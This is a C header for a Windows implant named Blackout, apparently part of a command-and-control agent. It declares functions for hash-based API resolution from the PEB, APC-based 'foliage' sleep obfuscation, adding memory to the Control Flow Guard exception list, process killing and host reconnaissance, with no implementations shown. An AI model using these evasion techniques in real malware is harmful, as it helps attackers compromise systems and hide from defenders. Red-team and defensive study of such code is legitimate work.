#ifndef BLACKOUT_UTILS_H
#define BLACKOUT_UTILS_H

#include <windows.h>
#include <Native.h>
#include <winhttp.h>

ULONG HashString(
    _In_ PVOID  String,
    _In_ SIZE_T Length
);

/*!
 * @brief
 * Get value of the specified environment variable
 * 
 * @param EnvVar
 * Target environment variable to get value
 * 
 * @return
 * Return target value
 */
PWSTR GetEnvVar( 
    _In_ PWSTR EnvVar 
);

/*!
 * @brief
 * Allocate memory in the heap
 * 
 * @param Size
 * Size of the memory allocation
 * 
 * @return 
 * return memory address allocated
 */
PVOID bkHeapAlloc( 
    UINT64 Size
);

/*!
 * @brief 
 * ReAllocated memory in the heap
 * 
 * @param Addr
 * Addr of the reallocate, this is return from bkHeapAlloc
 * 
 * @param Size
 * Size to the reallocation
 * 
 * @return
 * return memory reallocated
 */
PVOID bkHeapReAlloc(
    PVOID  Addr,
    UINT64 Size
);

/*!
 * @brief
 * Free heap memory
 * 
 * @param Data
 * Data address to free
 * 
 * @param Size
 * Size for the zero memory
 * 
 * @return
 * Return boolean based in success
 */
BOOL bkHeapFree(
    PVOID  Data,
    UINT64 Size
);

/*!
 * @brief
 * kill target process
 * 
 * @param ProcessId
 * process id to kill
 */
BOOL KillProcess(
	_In_ DWORD ProcessId
);

/*!
 * @brief
 * retrieves the infos of the process
 *
 * @param FullPath
 * full path of the process
 * 
 * @param BaseName
 * process name.
 * 
 * @param CmdLine
 * command line from the process
 */
VOID GetProcessInfo(
	_Out_     PWSTR *FullPath,
	_Out_     PWSTR *BaseName,
	_Out_     PWSTR *CmdLine
);

/*!
 * @brief 
 * get informations from the target computer
 *
 * @param ProcessArch
 * number representing the architecture, needs to be manipulated
 * 
 * @param ProcessType
 * number representing the type of process, needs to be manipulated
 * 
 * @param ProductType
 * number representing the product type, needs to be manipulated
 */
VOID GetComputerInfo(
	_Out_ WORD  *ProcessArch,
	_Out_ DWORD *ProcessType,
	_Out_ DWORD *ProductType,
    _Out_ PSTR  *IpAddress
);

/*!
 * @brief
 *  resolve module from peb
 *
 * @param Buffer
 *  either string or hash
 *
 * @param Hashed
 *  is the Buffer a hash value
 *
 * @return
 *  module base pointer
 */
PVOID LdrModuleAddr(
    _In_ ULONG Hash
);

/*!
 * @brief
 * resolve export function from module
 * 
 * @param BaseModule
 * module base address to get export function
 * 
 * @param FuncHash
 * hash of the function
 * 
 * @return
 * function base address 
 */
PVOID LdrFuncAddr(
    _In_ PVOID Module,
    _In_ ULONG Function
);

/*!
 * @brief 
 * initialize implant configs
 */
VOID BlackoutInit(
    VOID
);

/*!
 * @brief
 * implant entrypoint
 * 
 * @param Param
 * param passed to implant from caller
 */
VOID BlackoutMain(
    _In_ PVOID Param
);

VOID SleepMain(
    DWORD SleepTime
);

/*!
 * @brief
 * foliage sleep obfuscation technique APC based
 * 
 * @param SleepTime
 * time to sleeping
 */
VOID FoliageObf( 
    _In_ DWORD SleepTime
);

/*!
 * @brief
 * check if CFG is enabled
 * 
 * @return
 * return boolean value, TRUE if cfg enabled and FALSE if CFG disabled
 */
BOOL CfgCheckEnabled(
    VOID
);

VOID CfgAddressAdd( 
    _In_ PVOID ImageBase,
    _In_ PVOID Function
);

/*!
 * @brief
 *  add private memory to CFG exception list.
 * 
 * @param hProcess
 *  target process handle 
 * 
 * @param Addr
 *  private memory address to add to the cfg list
 *
 * @param Size
 *  private memory address size to add to the cfg list
 */
VOID CfgPrivateAddressAdd(
    _In_ HANDLE hProcess,
    _In_ PVOID  Address,
    _In_ DWORD  Size
);

EXTERN_C VOID volatile ___chkstk_ms(
        VOID
);

/*============================[ Memory ]============================*/

PVOID MemSet( void* Destination, int Value, size_t Size );
PVOID MemCopy( _Inout_ PVOID Destination, _In_ CONST PVOID Source, _In_ SIZE_T Length );
void  MemZero( _Inout_ PVOID Destination, _In_ SIZE_T Size );

/*============================[ Strings ]============================*/

SIZE_T WCharStringToCharString( _Inout_ PCHAR Destination, _In_ PWCHAR Source, _In_ SIZE_T MaximumAllowed );
SIZE_T CharStringToWCharString( _Inout_ PWCHAR Destination, _In_ PCHAR Source, SIZE_T _In_ MaximumAllowed );
SIZE_T StringLengthA(_In_ LPCSTR String);
void   InitUnicodeString( _Out_ PUNICODE_STRING UsStruct, _In_opt_ PCWSTR Buffer);
SIZE_T StringLengthW(_In_ LPCWSTR String);
INT    StringCompareA(_In_ LPCSTR String1, _In_ LPCSTR String2);
INT    StringCompareW(_In_ LPCWSTR String1, _In_ LPCWSTR String2);
void   toLowerCaseChar(char* str);
WCHAR  toLowerCaseWchar(WCHAR ch);
PCHAR  StringCopyA(_Inout_ PCHAR String1, _In_ LPCSTR String2);
PWCHAR StringCopyW(_Inout_ PWCHAR String1, _In_ LPCWSTR String2);
WCHAR  StringConcatW(_Inout_ PWCHAR String, _In_ LPCWSTR String2);
PCHAR  StringConcatA(_Inout_ PCHAR String, _In_ LPCSTR String2);
BOOL   IsStringEqual ( _In_ LPCWSTR Str1, _In_ LPCWSTR Str2 );
void   InitUnicodeString( _Out_ PUNICODE_STRING UsStruct, _In_opt_ PCWSTR Buffer);
ULONG  Random32();
ULONG  RandomNumber32( VOID );

/*============================[ Debug ]============================*/

#define ERROR_BUF_SIZE					(MAX_PATH * 2)
/*
#define PRINTA( STR, ... )                                                                           \
    if (1) {                                                                                        \
        LPSTR cBuffer = (LPSTR)HeapAlloc( NtProcessHeap(), HEAP_ZERO_MEMORY, ERROR_BUF_SIZE);       \
        if (cBuffer){                                                                               \
            int iLength = wsprintfA(cBuffer, STR, __VA_ARGS__);                                     \
            WriteConsoleA(GetStdHandle(STD_OUTPUT_HANDLE), cBuffer, iLength, NULL, NULL);           \
            HeapFree( NtProcessHeap(), 0x00, cBuffer);                                              \
        }                                                                                           \
    }  

#define PRINTW( STR, ... )                                                                   \
    if (1) {                                                                                 \
        LPWSTR buf = (LPWSTR)HeapAlloc( NtProcessHeap(), HEAP_ZERO_MEMORY, 1024 ); \
        if ( buf != NULL ) {                                                                 \
            int len = wsprintfW( buf, STR, __VA_ARGS__ );                                    \
            WriteConsoleW( GetStdHandle( STD_OUTPUT_HANDLE ), buf, len, NULL, NULL );        \
            HeapFree( NtProcessHeap(), 0, buf );                                             \
        }                                                                                    \
    } 
*/ 

/*===================================[ Kernel32 ]===================================*/
    


#endif //BLACKOUT_UTILS_H
